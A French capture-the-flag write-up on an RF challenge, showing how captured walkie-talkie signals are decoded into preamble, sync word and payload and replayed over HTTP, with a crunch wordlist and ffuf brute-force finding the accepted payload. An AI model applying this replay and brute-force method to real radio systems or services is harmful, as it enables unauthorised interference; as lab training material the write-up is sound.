---
title: "Walkie Hackie"
date: "19-04-2024"
thumbnail: "/assets/img/thumbnail/talkie.webp"
---
Description du challenge : 
*Our agents got caught during a mission and found that the guards are using old walkie-talkies for their communication. The field team captured their transmissions. Can you interrupt their communication to help our agents escape from the guards?*

Pour ce chall, on nous fournit 4 transmissions audio au format `complex`. 
On peut essayer de se connecter à l'instance avec `netcat` mais rien ne se passe sauf si on écrit quelque chose comme *pouet* :
```bash
> nc 94.237.56.188 40252
pouet
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad request syntax ('pouet').</p>
        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
    </body>
</html>

```
Ok, c'est un serveur web derrière, testons une requête avec `curl`. Cette fois-ci, on obtient des choses intéressantes nottament ça :
```html
 <h4>Send RF Signals Over HTTP</h4><br/>
     <table><form method="post" action="/transmit">
      <tr><td>Preamble:</td><td><input type="text" name="pa" placeholder="Ex: AABBCCDD" /></td></tr>
      <tr><td style="color:white;">Sync Word:</td><td><input type="text" name="sw" placeholder="Ex: AABBCCDD"/></td></tr>
      <tr><td>Payload:</td><td><input type="text" name="pl" placeholder="Ex: AABBCC"/></td></tr>
      <tr><td colspan="3"><button class="btn btn-outline-success">Transmit</button></td></tr></form>
    </table>
```
Ça nous explique comment envoyer un signal en **HTTP**.  
On a 3 paramètres qui consitutent notre signal : 
- `pa` qui est un **préambule**
- `sw` qui est un **sync word**
- `pl` qui est un **payload**
Ok, testons. d'envoyer quelque chose avec une requête **POST** sur `/transmit` : 
```bash
curl -X POST http://94.237.56.188:40252/transmit -d 'pa=prout&sw=wesh&pl=pouet'
```
Mais ça nous renvoit la même chose qu'avant. Il faut surement y mettre un préambule spécifique ou je sais pas. Bref, allons voir de plus prés les signaux avec [Universal Radio Hacker](https://github.com/jopohl/urh) 
Donc, on ouvre nos fichier avec **URH**. En affichant les données en **hexa**, on constate que les 4 signaux fournies suivent une même logique : 
```bash
Signal 1 : aaaaaaaa73214693a1ff14
Signal 2 : aaaaaaaa73214693a2ff84
Signal 3 : aaaaaaaa73214693b2ff24
Signal 4 : aaaaaaaa73214693b1ff57
```
Ça a l'air de matcher avec nos 3 paramètres, pour le signal 1, `aaaaaaaa` serait le **préambule**, `73214693` le **sync word** et `a1ff14` le payload. 

J'essaie de refaire la requête avec `curl`mais toujours rien. 
Par contre, on remarque que les payloads, suivent eux aussi une logique, avec 2 caractères **hexa**, `ff`, et 2 autres caractères **hexa**. 
On pourrait se créer une wordlist pour brute force tous les payloads possibles et voir si une page réagit différemment.
Créons d'abord une wordlist avec `crunch` : 
```bash
crunch 6 6 0123456789ABCDEF -t @@FF@@ -o pouet
```
Passons au bruteforce avec `ffuf`. Sans oublier le `Content-Type` si non, il ne se passe rien.
```bash
ffuf -c -w pouet -u http://94.237.56.188:40252/transmit -X POST -d "pa=aaaaaaaa&sw=73214693&pl=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"
```
On note la size d'une requête type qui fait **2831**, **CtrlC** puis on refait la même commande en y rajoutant le `-fs 2831` pour voir si une requête a une taille différente. 
On laisse mijoter et là, on voit que TOUS les **payload** qui ont leur deuxième partie à **F9** ont une size différente.
```
<SNIP>
[Status: 200, Size: 2896, Words: 420, Lines: 134, Duration: 25ms]
    * W1: 9B
    * W2: F9

[Status: 200, Size: 2896, Words: 420, Lines: 134, Duration: 23ms]
    * W1: A7
    * W2: F9

[Status: 200, Size: 2896, Words: 420, Lines: 134, Duration: 25ms]
    * W1: BE
    * W2: F9
```
Reste plus qu'à refaire un `curl` avec un **F9** à la fin. Par example : 
```bash
curl -X POST http://94.237.56.188:40252/transmit -d 'pa=aaaaaaaa&sw=73214693&pl=a2fff9'
```
Et le flag apparaît dans la réponse !!!
<3 sur ce chall vraiment fun. 